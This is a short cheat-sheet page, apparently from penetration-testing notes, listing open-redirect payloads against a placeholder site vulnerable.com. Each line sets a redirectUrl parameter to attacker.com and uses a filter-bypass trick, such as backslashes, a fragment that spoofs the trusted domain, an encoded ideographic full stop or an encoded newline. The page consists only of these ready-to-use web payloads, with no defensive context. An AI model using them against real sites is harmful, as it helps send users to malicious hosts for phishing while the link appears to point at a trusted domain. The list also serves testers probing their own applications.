---
title: Open Redirect
desc:
tags: [Web]
alts: []
render_with_liquid: false
---

## Cheat Sheet

```html
https://vulnerable.com/example.php?redirectUrl=https://attacker.com/
https://vulnerable.com/example.php?redirectUrl=https:\\attacker.com\
https://vulnerable.com/example.php?redirectUrl=https://attacker.com#.vulnerable.com/
<!-- "%E3%80%82" is "." -->
https://vulnerable.com/example.php?redirectUrl=https://attacker.com%E3%80%82%23.vulnerable.com/
<!-- "%0d" is newline  -->
https://vulnerable.com/example.php?redirectUrl=/%0d/attacker.com/
```